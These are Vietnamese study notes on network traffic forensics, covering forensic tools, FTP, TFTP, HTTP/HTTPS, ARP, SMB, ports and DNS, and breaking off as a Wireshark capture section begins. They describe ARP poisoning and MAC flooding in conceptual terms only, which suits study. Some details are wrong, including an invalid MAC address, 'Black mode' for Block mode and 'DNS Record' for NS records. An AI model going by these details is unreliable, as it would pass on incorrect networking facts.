## NETWORK TRAFFIC FORENSICS
- Trong thế giới hiện đại, networks là một phần không thể thiếu trong cuộc sống thường ngày, cho phép ta giao tiếp, truy cập thông tin và thực hiện các hoạt động online khác nhau. Tuy nhiên, networks cũng là mục tiêu bị nhắm tới với các mục đích xấu để khai thác lỗ hổng.
- Một số công cụ chính trong Network Forensics:
    - **Wireshark, Network Miner**: Bắt và phân tích gói tin với giao diện đồ hoạ.
    - **Tcpdump**: Phân tích gói tin với giao diện console.
    - **p0f**: Để phát hiện hệ điều hạnh, console trên nền Linux.
    - **netcat**: Debug kết nối, đóng vai trò cả client và server, console trên Windows và Linux.
    - **Snort**: Opensource phát hiện xâm nhập.
    - **Nmap, tcpxtract, ssldump, nslookup, maxmind,...**
- Trong phần này, ta sẽ ôn lại những phần cơ bản của networks gồm địa chỉ IP, giao thức và cổng. Ta sẽ xem rằng làm thế nào chúng hoạt động cùng nhau để thực hiện việc giao tiếp giữa các thiết bị. Tiếp theo là phân tích forensics lưu lượng networks, ta sẽ phân tích việc thu thập lưu lượng cho mục đích xấu bằng cách xem xét sự bất thường trong các mẫu lưu lượng, nhận diện các sự cố gắng truy nhập trái phép và tìm ra source của bất kỳ attacks nào.

### I. Basic Networking Refresher
Nói một cách đơn giản, network là một nhóm các thiết bị kết nối nhau để giao tiếp và chia sẻ thông tin, files và tài nguyên. Các thiết bị này phải có một địa chỉ IP, một giao thức và một cổng để giao tiếp với nhau, việc hiểu rõ những cái này rất quan trọng vì đây là cơ sở để điều tra bất kỳ hoạt động độc hại nào trên network.

#### 1. Địa chỉ IP
Là địa chỉ độc nhất của một thiết bị trên network. Nó giúp nhận diện vị trí của thiết bị và giúp giao tiếp với các thiết bị khác dễ dàng hơn.

#### 2. Giao thức
Là một bộ quy tắc quản lý sự giao tiếp giữa các thiết bị trên một network (HTTP, SSH, FTP,...).
> Ví dụ, khi truy cập một website, máy tính sẽ gửi một HTTP request đến web server và web server sẽ phản hồi lại HTTP response chứa webpage ta yêu cầu.

##### File Transfer Protocol (FTP):
###### Định nghĩa:
![image](https://hackmd.io/_uploads/SyC0h7rB-x.png)
- Là giao thức để truyền tải tệp tin, trao đổi dữ liệu giữa các thiết bị máy tính với nhau.
- User có thể tải dữ liệu lên máy chủ hoặc lấy bất kì dữ liệu tập tin nào từ máy chủ về máy của mình từ xa thông qua TCP hoặc Internet.
- Port 20 và 21.

###### Một số ứng dụng:
- Chia sẻ thông tin, trao đổi dữ liệu giữa các chi nhánh công ty và đối tác kinh doanh.
- Đội ngũ IT có thể sử dụng FTP để khôi phục dữ liệu sau các sự cố, đảm bảo tính liên tục của hoạt động kinh doanh.
- Tải lên và cập nhật nội dung như trang web, hình ảnh, tài nguyên lên máy chủ của doanh nghiệp.

###### Cách hoạt động:
![image](https://hackmd.io/_uploads/HyHLTmBrbl.png)
Hoạt động theo mô hình hai hướng (nhận và truyền dữ liệu từ server tói client) tạo nên từ hai tiến trình TCP logic:
- Control Connection: 
    - Phiên làm việc TCP logic đầu tiên được thiết lập khi bắt đầu truyền tải dữ liệu.
    -  Cho phép kiểm soát dữ liệu khi nó lưu chuyển qua
    -  Được duy trì xuyên suốt quá trình truyền tải.
    -  Quản lý, kiểm soát thông tin điều khiển đi qua nó.
- Data Connection:
    - Kết nối dữ liệu hai chiều giữa server và client.
    - Tự động thiết lập khi cần truyền dữ liệu.
    - Chỉ đóng lại sau khi quá trình truyền tải kết thúc.
    - Đảm bảo việc trao đổi diễn ra hiệu quả và an toàn.

###### Ưu và nhược điểm:
- Ưu điểm:
    - Cho phép server gửi nhiều file cùng lúc với dung lượng lớn, tiết kiệm thời gian và năng suất.
    - Trong quá trình truyền, nếu mạng lỗi, file tự động gửi lại khi mạng ổn định.
    - Tích hợp tự động chuyển tập tin script, tự động hoá các quy trình và giảm thiểu sự can thiệp từ user.
    - Cho phép thêm dữ liệu vào khung chờ và lên lịch truyền tải dữ liệu linh hoạt, giúp sắp xếp việc truyền tải dữ liệu hiệu quả.
    - Hỗ trợ đồng bộ file lên server và máy cá nhân, đảm bảo dữ liệu trên các thiết bị khác nhau luôn đồng bộ.
- Nhược điểm:
    - Khả năng bảo mật kém: Những phiên cơ bản không có chương trình mã hoá dữ liệu nên dễ bị đánh cắp.
    - Dễ bị tấn công: Do sử dụng phương thức nhận diện, xác thực thông qua tên user và mật khẩu nên dễ bị brute force.
    - Khó khăn trong quản lý quyền truy cập.

###### Các phương thức truyền tải:
- Stream mode:
    - Phương thức truyền tải dữ liệu dựa trên độ tin cậy của TCP.
    - Quá trình truyền tải bắt đầu khi kết nối được thiết lập và kết thúc khi ngắt kết nối.
    - Dữ liệu được gửi dưới dạng chuỗi các byte không cấu trúc liên tiếp.
    - Thiết bị gửi chỉ cần truyền luồng dữ liệu trực tiếp qua kết nối TCP đến bên nhận.
- Black mode:
    - Là phương thức truyền dữ liệu có tiêu chuẩn hơn Stream mode.
    - Toàn bộ dữ liệu cần chuyển được chia thành nhiều phần nhỏ hơn và đóng gói thành các FTP blocks riêng biệt.
    - Mỗi FTP block chứa các thông tin mô tả về khối dữ liệu được truyền.
    - Kiểm soát và quản lý quá trình truyền hiệu quả hơn.
- Compressed mode:
    - Phương thức truyền tải áp dụng kỹ thuật nén dữ liệu cơ bản là "mã hoá độ dài chạy" (run - length encoding).
    - Thuật toán hoạt động bằng cách nhận diện và loại bỏ phần dữ liệu lặp lại trong thông điệp.
    - Kết quả: Kích thước tổng thể của dữ liệu được giảm đáng kể trước khi truyền, giúp tối ưu hoá băng thông và thời gian truyền.

###### Các loại phổ biến hiện nay:
- FTP Plain:
    - Giao thức truyền tải các dữ liệu qua kết nối TCP dạng văn bản bằng kết nối mạng máy tính.
    - Nhược điểm: Không có tính năng bảo mật và mã hoã dữ liệu, dễ bị tấn công và đánh cắp.
- FTP Secure (FTPS):
    - Dạng biến thể của FTP, được nâng cấp và mã hoá bằng SSL hoặc TLS, đảm bảo tính bí mật và an toàn cao khu truyền dữ liệu qua kết nối mạng.
    - Hỗ trợ các chế độ bảo mật và phương thức khác nhau, giúp user bảo vệ thông tin cá nhân và dữ liệu.
- FTP Explicit SSL (FTPES):
    - Tương tự FTP Secure, cũng dụng mã hoá SSL hoặc TLS để bảo mật dữ liệu.
    - Để kết nối đến FTPS server, user phải thiết lập kết nối bảo mật trước khi truyền dữ liệu, giúp bảo vệ dữ liệu, hỗ trợ đăng nhập và xác minh thông tin.

##### Trivial File Transfer Protocol (TFTP):
###### Định nghĩa:
- Là công nghệ chuyển các file giữa các thiết bị mạng.
- Phiên bản đơn giản hoá của giao thức FTP.
- Không cần xác thực user.

###### Cách hoạt động:
- Sử dụng UDP để giao tiếp tệp, thiết lập kết nối bằng port 69.
- Sau khi thiết lập kết nối, client yêu cầu:
    - RRQ (Read Request): Nếu chỉ muốn đọc tệp.
    - WRQ (Write Request): Nếu muốn ghi tệp cụ thể tồn tại trên server.
- Các tệp giao tiếp chia thành gói nhỏ (512  bytes).
- Gói được truyền từ server đến client. Server đợi thông báo nhận được từ client, khi có xác nhận sẽ gửi gói tiếp theo cho đến khi gói cuối cùng được truyền.
- Khi gói được truyền, server bắt đầu một bộ đếm và đợi đến thời điểm có xác nhận từ client. Nếu không có xác nhận, server gửi lại cùng một gói cho đến khi nhận được. Nếu xác nhận có trước bộ đếm thời gian thì sẽ gửi gói tiếp theo.
- Gói cuối cùng luôn nhỏ hơn 512 byte để client hiểu rằng nó đã nhận được tệp.

###### Ứng dụng:
- Truyền tệp.
- Khởi động từ xa không cần ổ cứng.
- Upgrade code.
- Sao lưu cấu hình mạng.
- Sao lưu tệp cấu hình bộ định tuyến.
- Lưu hình ảnh IOS.
- Khởi động PC không cần đĩa.

###### Phân loại:
- Read request (RRQ): Gói tin mà client gửi cho server để yêu cầu tải xuống file từ server, gồm tên file và tuỳ chọn là chế độ truyền.
- Write request (WRQ): Client gửi gói tin này cho server để yêu cầu upload một file lên server, gồm tên file và tuỳ chọn là chế độ truyền.
- Data packet (DATA): Server gửi các gói tin cho client chứa dữ liệu của file được yêu cầu tải xuống, chứa một đoạn dữ liệu có kích thước tối đa là 512 byte.
- Acknowledgement request (ACK): Client gửi gói tin cho server để xác nhận đã nhận được gói data packet, server dựa vào nó để điều chỉnh tốc độ gửi dữ liệu và đảm bảo tính hoàn chỉnh của truyền.
- Ít phổ biến hơn:
    - Error packet: Được gửi để thông báo lỗi trong quá trình truyền.
    - Option Acknowledgement Packet: Dùng để xác nhận các tuỳ chọn truyền file cụ thể được yêu cầu bởi client.

###### Ưu điểm:
- Dùng giao thức UDP.
- Dễ thực hiện.
- Yêu cầu ít mã hoá hơn.
- Ít bộ nhớ hơn.

##### HyperText Transfer Protocol (HTTP):
###### Sơ đồ hoạt động:
![image](https://hackmd.io/_uploads/rye1MCBrbl.png)
- HTTP hoạt động dựa trên mô hình Client - Server. Trong mô hình này, các máy tính của user đóng vai trò Client. Sau thao tác nào đó, client gửi request đến server và chờ response từ server.
- HTTP là một stateless protocol, nghĩa là request hiện tại không biết những gì đã hoàn thành trong request trước đó.
- HTTP cho phép tạo request gửi và nhận các kiểu dữ liệu, cho phép xây dựng hệ thống độc lập với dữ liệu được chuyển giao.

###### Uniform Resource Locator (URL):
- Dùng để xác định duy nhất một tài nguyên trên web.
- Cấu trúc: `protocol://hostname:port/path-and-file-name`
    - `protocol`: Giao thức tầng ứng dụng dùng bởi client và server.
    - `hostname`: Tên DNS.
    - `port`: Cổng TCP để server nghe request từ client.
    - `path-and-file-name`: Tên, vị trí của tài nguyên.

###### Một số khái niệm liên quan:
- Bộ giao thức TCP/IP là bộ giao thức truyền thông cài đặt chồng giao thức mà Internet và hầu hết mạng máy tính thương mại đang chạy.
    - TCP (Transmission Control Protocol): Giao thức điều khiển truyền vận.
    - IP (Internet Protocol): Giao thức Internet.
- Các giao thức được chia thành các tầng, mỗi tầng sử dụng giao thức tầng dưới để đạt được mục đích:
    - Layer 1 - Network Acess Layer: Xác định chi tiết cách dữ liệu được gửi qua mạng bởi các thiết bị phần cứng trực tiếp giao tiếp với môi trường mạng.
    - Layer 2 - Internet Layer: Đóng gói dữ liệu vào các gói tin thông qua giao thức IP, chứa địa chỉ nguồn và đích (địa chỉ logic hoặc địa chỉ IP) dùng để chuyển tiếp gói tin giữa máy chủ qua mạng.
    - Layer 3 - Transport Layer: Cho phép thiết bị trên máy chỉ nguồn và đích trao đổi dữ liệu, xác định mức service và trạng thái kết nối được dùng khi chuyển dữ liệu. Giao thức chính là TCP.
    - Layer 4 - Application Layer: Thực thể của lớp cung cấp ứng dụng cho phép user trao đổi dữ liệu ứng dụng qua mạng.

###### Các thành phần chính:
- **HTTP - Requests:**

    ![image](https://hackmd.io/_uploads/SkER6CBHZx.png)
    - Là phương thức chỉ ra hành động mong muốn được thực hiện trên tài nguyên đã xác định.
    - Cấu trúc:
        - **Request-line = Phương thức + URI-Request + Phiên bản HTTP**. Giao thức HTTP định nghĩa tập các giao thức GET, POST, HEAD, PUT,... Client có thể dùng một trong các giao thức để gửi request lên server.
        - Có thể có hoặc không các trường header.
        - Một dòng trống để đánh dấu sự kết thúc của các trường Header. Request Header Fields cho phép client truyền thông tin bổ sung về yêu cầu, về chính client đến server.
        - Tuỳ chọn một thông điệp.
    - Khi request đến server, server thực hiện một trong ba hành động:
        - Server phân tích request nhận được, maps yêu cầu với tập tin trong tài liệu của server và trả lại tập tin cho client.
        - Server phân tích request nhận được, maps yêu cầu vào một chương trình trên server, thực thi chương trình và trả lại kết quả.
        - Request từ client không thể đáp ứng, server trả lại thông báo lỗi.
    - Một số HTTP Request Method phổ biến:
 
        ![image](https://hackmd.io/_uploads/ryVW1J8HZx.png)
- **HTTP - Responses:**

    ![image](https://hackmd.io/_uploads/Hk_BJJIrZg.png)
    - Cấu trúc HTTP response:
        - **Status-line = Phiên bản HTTP + Mã trạng thái + Trạng thái**
        - Có thể có hoặc không có trường header.
        - Một dòng trống để đánh dấu sự kết thúc của các trường header.
        - Tuỳ chọn một thông điệp.
    - Mã trạng thái: Thông báo về kết quả khi nhận được request và xử lý bên server cho client:
        - `1xx` (`100` - `101`): Thông tin
        - `2xx` (`200` - `206`): Thành công
        - `3xx` (`300` - `307`): Sự điều hướng lại
        - `4xx` (`400` - `417`): Lỗi phía Client
        - `5xx` (`500` - `505`): Lỗi phía Server

##### Hypertext Transfer Protocol Secure (HTTPS):
###### Định nghĩa:
- Là phiên bảo nâng cao của HTTP.
- HTTP dùng cổng 80 để giao tiếp mạng, HTTPS dùng cổng 443 (Cổng hỗ trợ mã hoá thông tin từ client truyền đến server, bảo vệ mọi dữ liệu được truyền qua Internet).
- Giao thức TLS bảo mật thông tin liên lạc bằng cơ sở hạ tầng public key bất đối xứng. Hệ thống bảo mật này dùng key để mã hoá dữ liệu trong server, public key có sẵn cho bất kỳ ai muốn tương tác an toàn với server.
- Mã hoá xảy ra khi server hoặc client truyền dữ liệu, dùng mã hoá public key để bảo mật dữ liệu mà chỉ private key mới giải mã được. Chủ sở hữu dùng hai key để kiểm soát truy cập dữ liệu server.
- Trang web bảo mật dùng HTTPS hiển thị dấu hiệu ổ khoá trên thanh địa chỉ. Hầu hết các trang web hiện nay đều dùng HTTPS để bảo mật dữ liệu.

###### Cách hoạt động:
- User truy cập website bằng địa chỉ bắt đầu với HTTPS.
- Trình duyệt gửi yêu cầu xác minh và nhận chứng chỉ SSL/TLS từ server.
- Server phản hồi bằng chứng chỉ SSL kèm theo khoá công khai.
- Trình duyệt dùng khoá công khai để mã hoá khoá phiên và gửi lại cho server.
- Server giải mã, xác nhận khoá phiên và phản hồi lại cho trình duyệt.
- Sau khi xác thực thành công, hai bên sử dụng khoá phiên để trao đổi dữ liệu an toàn.

###### Quá trình giao tiếp giữa client và server:
- Client gửi yêu cầu truy cập đến website có địa chỉ bắt đầu bằng `https://`.
- Server phản hồi bằng cách gửi chứng chỉ SSL/TLS cho client.
- Trình duyệt kiểm tra tính hợp lệ của chứng chỉ thông qua đơn vị cấp chứng chỉ (CA).
- Sau khi chứng chỉ được xác thực, client tạo một khoá phiên ngẫu nhiên. Khoá này được mã hoá bằng khoá công khai trong chứng chỉ và gửi về server.
- Server dùng khoá bí mật để giải mã khoá phiên.
- Từ lúc này, client và server dùng khoá phiên để mã hoá và giải mã toàn bộ dữ liệu trao đổi trong suốt phiên làm việc.

###### So sánh HTTP và HTTPS:
![image](https://hackmd.io/_uploads/SkqiH1IBZe.png)

##### Address Resolution Protocol (ARP):
###### Định nghĩa:
Là giao thức được áp dụng để xác định địa chỉ MAC (Media Access Control) của một thiết bị từ địa chỉ IP nguồn. Nó thường được dùng khi một thiết bị muốn liên lạc với thiết bị khác trong mạng cục bộ.
- Thiết bị gửi thông điệp ARP nhằm chuyển đổi địa chỉ IP thành địa chỉ MAC.
- Trong quá trình, thiết bị gửi request ARP chứa địa chỉ IP của thiết bị đích. Tất cả thiết bị trong mạng local sẽ thấy thông điệp.
- Chỉ thiết bị có địa chỉ IP được yêu cầu mới có thể phản hồi với thông điệp chứa địa chỉ MAC của nó.
- Thiết bị gửi request có đủ thông tin cần thiết để gửi gói tin đến thiết bị đích.

###### Lịch sử và mục đích:
- Xuất hiện và phát triển từ đầu những năm 80s với vai trò quản lý việc dịch địa chỉ chung cho các mạng IP.
- Triển khai rộng rãi với Ethernet, Wifi, ATM, Token Ring,...
- Đặc tính cho phép mạng quản lý các kết nối độc lập với từng thiết bị vật lý cụ thể được kết nối vào mạng, giúp giao thức Internet hoạt động hiệu quả hơn vì nó không cần tự quản lý địa chỉ của thiết bị phần cứng và mạng vật lý.

###### Phân loại:
Gồm bốn loại chính:
- Proxy ARP:
    - Thiết kế cho các thiết bị nội mạng.
    - Phạm vi hoạt động cục bộ.
    - Yêu cầu các thiết bị Proxy trong mạng phải phản hồi cho các yêu cầu ARP không chứa địa chỉ IP nằm trong mạng.
    - Dùng để xác định vị trí đích cho lưu lượng truy cập và cung cấp địa chỉ MAC của chính nó để dùng làm đích.
- Gratuitous ARP:
    - Tương tự quy trình thông thường nhưng thực hiện trên server, đây là loại yêu cầu khác của host giúp xác định địa chỉ IP trùng lặp.
    - Không gửi yêu cầu dịch vụ hay thực hiện ARP request từ IP sang MAC.
- Reverse ARP:
    - Dùng trong hệ thống client mạng LAN để yêu cầu địa chỉ IPv4 từ bảng ARP của router.
    - Máy chủ không thể tự nhận diện địa chỉ IP nhưng có thể dùng Reverse ARP để xác định địa chỉ của chính nó.
    - Admin tạo bảng trong gateway hoặc router để xác định địa chỉ MAC tới IP.
- Inverse ARP:
    - Phổ biến trong rơ-le frame của ATM.
    - Dùng để tìm IP của node từ địa chỉ lớp liên kết dữ liệu.
    - Thu thập địa chỉ mạch ảo ở lớp 2 từ việc signal của Layer 2.

###### Cách hoạt động:
![image](https://hackmd.io/_uploads/SkTeKpFr-g.png)
- Giả sử:
    - Host A có địa chỉ IP `192.168.1.0`, địa chỉ MAC `74-2F-6K-B6-44-10`.
    - Host B có địa chỉ IP `192.168.1.120`, địa chỉ MAC `02-FE-05-A7-00-01`.
    - Host A muốn tìm địa chỉ MAC của host có địa chỉ IP `192.168.1.120`.
- Cơ chế:
    - Host A phát ra gói tin ARP request (dạng broadcast) trên mạng yêu cầu tìm MAC của host có IP `192.168.1.120`.
    - Gói tin dạng broadcast nên nó gửi đến tất cả host trong mạng.
    - Tất cả host kiểm tra nó đúng là IP của mình không. Nếu không thì bỏ qua, nếu đúng thì lấy địa chỉ MAC của nó gửi gói tin ARP reply (dạng unicast) về host A.
    - Host A có địa chỉ MAC của host B, lưu và ARP cache của nó.
###### Các lỗ hổng liên quan:
Khi một host nhận được gói tin ARP Reply, nó hoàn toàn tin tưởng và dùng thông tin đó để dùng sau này mà không cần biết thông tin đó có phải trả lời từ host mong muốn không.
- Man in middle/ARP Poison Routing: Cho phép attacker đứng giữa nghe trộm tất cả lưu lượng mạng giữa các máy tính nạn nhân. Giả sử hacker muốn theo dõi host A gửi thông tin gì cho host B:
    - Hacker gửi gói ARP Reply đến host A với nội dung là MAC của hacker, IP của host B.
    - Hacker gửi gói ARP Reply tới host B với nội dung là MAC của hacker, IP của host A.
    - Hai host A và B đều nhận gói tin ARP Reply và lưu vào ARP table.
    - Khi host A muốn gửi thông tin đến host B, nó tra table và thấy có sẵn thông tin về địa chỉ MAC (attacker) và lấy ra dùng. Máy hacker mở chức năng IP Forwading giúp truyền tải nội dung mà host A gửi qua host B.
    - Host A và B giao tiếp bình thường và không có cảm giác bị qua máy trung gian là máy của hacker.
- Denial of Service - Tấn công từ chối dịch vụ:
    - Hacker gửi gói ARP Reply đến toàn bộ host trong mạng với nội dung là IP của Gateway và MAC không tồn tại.
    - Các host trong mạng tin tưởng mình đã biết MAC của Gateway và gửi thông tin đến Gateway (nơi không hề tồn tại), toàn bộ các host không thể đi ra Internet.
- MAC Flooding: Dùng kỹ thuật ARP Poisoning mà đối tượng nhắm đến là Switch:
    - Hacker gửi gói ARP Reply giả tạo với số lượng khổng lồ nhằm làm Switch xử lý không kịp và quá tải.
    - Switch không đủ sức thể hiện bản chất Layer 2 mà broadcast gói tin ra toàn bộ port, hacker dễ dàng bắt được toàn bộ gói tin trong mạng.

###### Mối quan hệ với DHCP và DNS:
- Để bảo bị quyền riêng tư và đảm bảo an ninh cho user, IP thường thay đổi đều đặn. Việc thay đổi không ngẫu nhiên mà tuân theo quy tắc DHCP (Dynamic Host Configuration Protocal) - Giao thức Cấu hình Máy chủ Động.
- Khi muốn tìm thông tin trên Internet, máy tính dùng IP khó nhớ để kết nối với tên miền hoặc server. Để đưa hai yếu tố lại gần nhau, hệ thống phân giải tên miền (DNS - Domain Name System) ra đời, là công cụ dùng để dịch IP thành tên miền và ngược lại, tạo điều kiện cho kết nối hiệu quả giữa hai yếu tố.

##### Server Message Block (SMB):
- Là giao thức mạng dùng trong Windows và iOS, cung cấp cơ chế cho phép client truy cập hệ thống file server và các thiết bị I/O.
- Hoạt động ở lớp ứng dụng trong OSI, dùng các cấp độ mạng thấp hơpn để chuyển dữ liệu như lớp vận chuyển (TCP, UDP).
- Thiết lập kết nối giữa client và server, cho phép truy cập, ghi và thực thi các tệp trên server từ xa thông qua mạng. User có quyền chia sẻ tài nguyên với nhau hiệu quả.
- Trong trường hợp khối dữ liệu lớn, user chỉ cần lưu trữ dữ liệu trên máy tính và chia sẻ với người khác thông qua SMB mà không cần sao chép dữ liệu sang nhiều máy khác nhau.
- Cung cấp các phương tiện để kiểm soát quyền truy cập và bảo mật thông tin, giúp admin thiết lập chính sách an toàn thông tin phù hợp.
- Không ngừng phát triển để cải thiện hiệu suất, đáp ứng yêu cầu mới của user và các tiêu chuẩn an toàn thông tin.

###### Cách hoạt động:
![image](https://hackmd.io/_uploads/HylZbAFrWx.png)
- Client gửi request SMB đến server để bắt đầu kết nối.
- Server nhận được và gửi phản hồi SMB.
- Client nhận được phản hồi, nó tạo một kênh liên lạc và tương tác với server để yêu cầu quyền truy cập tài nguyên.
- Dùng các cổng mở để tạo điều kiện liên lạc trên mạng, hai cổng chính là `139` và `445` (được ưu tiên hơn, cổng dùng trên các version Windows hiện đại).

###### Chức năng:
- Hỗ trợ Unicode, cho phép làm việc với các ngôn ngữ và ký tự đa dạng.
- Tìm kiếm máy chủ bằng cách dùng các phiên bản SMB khác nhau.
- Chia sẻ file, folder.
- In qua mạng: Cho phép in ấn từ xa.
- Thông báo cho user về thay đổi xảy ra trong file/folder đang truy cập.
- Xử lý thuộc tính mở rộng của file, cho phép lưu trữ thông tin bổ sung và tuỳ chỉnh.
- Sắp xếp và đàm phán, tạo sự tương thich của các phiên bản và chế độ hoạt động của SMB.
- Khoá file đang truy cập theo yêu cầu, đảm bảo tính toàn vẹn và an toàn của dữ liệu. Khi kết hợp với giao thức xác thực NTLM, user được cấp gói chia sẻ file và máy in ở cấp độ user, giúp đơn giản hoá quy trình đăng nhập và truy cập dữ liệu từ các thiết bị khác nhau trên mạng.

#### 3. Ports (Cổng)
- Một port là một con số dùng để nhận diện app cụ thể hay service trên một thiết bị. Khi một thiết bị nhận lưu lượng network, nó dùng port number để quyết định lưu lượng này dành cho app hay service nào.
> Ví dụ, khi truy cập website bằng cách dùng HTTP, trình duyệt sẽ gửi request đến cổng 80 của web server.

- Một số giao thức và các port phổ biến:

![image](https://hackmd.io/_uploads/HJ2eD46Ebe.png)

#### 4. Domain Name System (DNS):
Hệ thống chuyển đổi các tên miền website sang địa chỉ IP tương ứng với tên miền và ngược lại.

##### a) Phân loại:
###### Root Name Server:
- Máy chủ tên miền chứa thông tin và là server quan trọng nhất trong hệ thống.
- Là thư viện định hướng tìm kiếm các máy chủ tên miền trong các miền cấp cao nhất (top - level domain name servers).
- Máy Root đóng vai trò là máy chủ tên miền cao nhất và tham chiếu đến các DNS server thấp hơn.
- Top - level domain name server cung cấp thông tin địa chỉ máy chủ cho miền ở cấp hai chứa tên miền muốn tìm. Quá trình tìm kiếm tiếp tục đến khi máy chủ tìm thấy tên miền mong muốn.
- Quá trình tìm kiếm tên miền bắt đầu bằng truy vấn gửi đến Root server. Việc tìm kiếm không thực hiện được nênú máy chủ tên miền không hoạt động ở mức root. Hiện nay có 13 hệ thống máy chủ tên miền ở mức này.

###### Local Name Server:
- Chứa thông tin giúp tìm kiếm máy chủ tên miền lưu trữ các tiên miền thấp hơn.
- Thường được vận hành, duy trì bởi doanh nghiệp và nhà cung cấp dịch vụ Internet - ISPs.

###### DNS Recursor:
- Tìm IP và trả thông tin đúng mà trình duyệt cần tìm.
- Liên lạc và dùng các hệ thống phân giải tên miền server khác để phản hồi đến client.
- Có cache giúp tăng tốc độ phản hồi.

###### Top level domain (TLD) Name Server:
- Quản lý hệ thống thông tin của phần mở rộng tên miền chung.
- Trong quá trình tìm kiếm IP thì máy chủ định danh sẽ lưu trữ phần cuối cùng của tên máy chủ.

###### Authority Name Server:
Chứa thông tin cho biết tên miền gắn với địa chỉ nào, là điểm dừng cuối trong truy vấn và phân giải IP cần thiết cung cấp cho DNS Recursor.

##### b) Các loại bản ghi:
- **A Record:** Đơn giản, phổ biến nhất. Dùng để trỏ tên website tới IP cụ thể. Có thể thêm tên mới dễ dàng, thêm Time to Live (thời gian tự động tái lại bản ghi) và Points to (địa chỉ tới IP mong muốn).
- **CNAME Record:** Đặt tên cho một hoặc nhiều tên khác nhau cho miền chính.
- **MX Record:** Chỉ định Server quản lý các dịch vụ email của các tên miền theo đó.
- **TXT Record:** Chứa thông tin định dạng văn bản của tên miền.
- **AAAA Record:** Giống A Record, được dùng để trỏ domain đến một địa chỉ IPv6.
- **DNS Record:** Chỉ định Name Server cho từng tên miền phụ.
- **SRV Record:** Bản ghi đặc biệt trong DNS, xác định chính xác dịch vụ nào, chạy port nào.

##### c) Cơ chế hoạt động:
- Khi nhập tên miền vào trình duyệt, request được gửi đến Recursive DNS Server.
- DNS Server thực hiện các bước tìm kiếm thông tin từ Root DNS Server đến Authoritative DNS Server.
- Server cuối cùng cung cấp địa chỉ IP tương ứng với tên miền.
- Được cung cấp địa chỉ IP, Recursive DNS Server trả về thông tin cho trình duyệt và cập nhật cache.
- Trình duyệt sử dụng địa chỉ IP để kết nối đến máy chủ web và tải trang web.

##### d) Nguyên tắc làm việc:
- Mỗi nhà cung cấp dịch vụ vận hành và duy trì hệ thống DNS riêng mình, gồm máy bên trong phần riêng của mỗi nhà cung cấp, chính là Internet. Nếu trình duyệt tìm kiếm địa chỉ website bất kỳ thì DNS server phân giải tên website là DNS server của chính tổ chức quản lý website.
- Internet Network Information Center (INTERNIC) theo dõi tên miền và DNS server tương ứng. Bên cạnh đó cũng chịu trách nhiệm đăng ký tên các miền của Internet. Ngoài ra còn có nhiệm vụ quản lý tất cả DNS trên server.
- Có khả năng truy vấn DNS Server khác với mục đích có được tên đã được phân giải. Trong đó, DNS server thường có điểm khác biệt nhất định:
    - Quản lý, chịu trách nhiệm phân giải tên miền từ các máy bên trong tên miền đến các địa chỉ Internet nó quản lý.
    - Trả lời DNS server khác bên ngoài đang cố gắng phân giải tên miền nó quản lý.

##### e) Public DNS & Private DNS:
- **DNS Private:**
    - Dùng với máy tính có tường lửa bảo vệ và dùng nhiều cho các máy tính trong mạng nội bộ. 
    - Máy tính cục bộ sẽ nhận dạng DNS theo tên và người ngoài không thể truy cập trực tiếp vào máy tính này.
- **Public DNS:** Cho phép server truy cập internet công cộng, nghĩa la địa chỉ IP của máy chủ hoàn toàn có thể truy cập được trên Internet.

##### f) Rò rỉ DNS:
Khi kết nối Internet qua VPN, DNS có thể đi thẳng trực tiếp tới ISP mà không đi qua VPN khác và cung cấp mọi thông tin website đang kết nối. Rò rỉ DNS là tiết lộ các hoạt động duyệt website của máy tới ISP, vị trí đến các website đang truy cập. Lúc này các tác dụng của VPN hầu như mất đi.

###### Nguyên nhân:
- Chủ yếu từ việc VPN được cấu hình không đúng cách, có thể gặp phải tại bất kỳ hệ điều hành và thiết bị nào kết nối với VPN.
- Nếu VPN cấu hình đúng, máy thiết lập kết nối với VPN bằng việc dùng ISP với các DNS Server của ISP. Nhờ đó kết nối dùng DNS của VPN và server phải được truy cập cùng một mạng với máy chủ của VPN, đảm bảo mã hóa lưu lượng DNS.
- Mô hình trên có thế không được tuân theo nếu gặp sự cố nào đó. Khi thực hiện không đúng mô hình, lưu lượng DNS có thể thoát khỏi VPN Tunnel và dễ dàng nhìn thấy ở bên ngoài, dẫn đến requests DNS có thể không được mã hóa theo mặc định. Lúc này, hầu hết ISP không hỗ trợ mã hóa theo yêu cầu từ DNS.

###### Cách kiểm tra và khắc phục:
- **Kiểm tra rò rỉ DNS từ trình duyệt:**
    - Nhiều dịch vụ VPN hiện nay có công cụ riêng giúp dễ dàng kiểm tra lỗi rò rỉ DNS (DNSleaktest.com).
    - Dấu hiệu rò rỉ kết nối DNS là có nhiều IP khác nhau không đến từ server Host của mình. Thường tên có thể không khớp vì các nhà cung cấp VPN thuê không gian cho server từ các host khác nhau, nên tập trung vào kiểm tra địa chỉ IP sẽ dễ phát hiện lỗi hơn.
- **Kiểm tra rò rỉ DNS bằng Torrent:**
    - Khác với truy cập lưu lượng thông thường, kiểm tra rò rỉ DNS bằng hoạt động Torrent phải có công cụ khác để kiểm tra chính xác các kết nối giữa user và Torrent.
    - Tool dùng để kiểm tra IP Torrent được khuyến khích là [pMagnet](http://ipmagnet.services.cbcdn.com/).
    - Thông qua tool kiểm tra, có thể dễ dàng xác định Torrent Client đang hiển thị IP nào bằng việc dùng một Magnet Link.

##### g) Các DNS phổ biến:
- **DNS Google:** Tốc độ nhanh, ổn định, thuận tiện. Các thông số: `8.8.8.8`, `8.8.4.4`.

- **DNS Cloudflare:** Giúp điều phối lượng truy cập qua lớp bảo vệ, được biết đến là một dịch vụ DNS trung gian. Các thông số: `1.1.1.1`, `1.0.0.1`.

- **DNS OpenDNS:** Có thể tìm kiếm máy chủ DNS công cộng dễ dàng, thậm chí là không có thời gian chết. Tốc độ truy cập nhanh, bảo vệ máy trước các sự tấn công trên Internet. Các thông số: `208.67.222.222`, `208.67.220.220`

### II. Network Traffic Forensics
Trong phần này, ta xem xét các tools và techniques được dùng để thu thập và phân tích lưu lượng mạng, xuất ra thông tin giá trị, ngăn chặn hành vi độc hại và điều tra các attacks trên mạng.

#### 1. Thu thập Network Traffic
- Điều tiên quyết để thực hiện forensics lưu lượng mạng là thu thập lưu lượng mạng. Điều này có thể đạt được bằng cách dùng network packet capture hay sniffing tool (Wireshark, `tcpdump`,...). Trong lab này ta sẽ dùng Wireshark là chính.
- Các bước thu thập live network traffic:
    - Mở Wireshark bằng `wireshark` trong Terminal trong Linux hoặc mở trong Start menu trên Windows.
    - Chọn một giao diện mạng mà ta muốn thu thập lưu lượng, đa số là `eth0`.
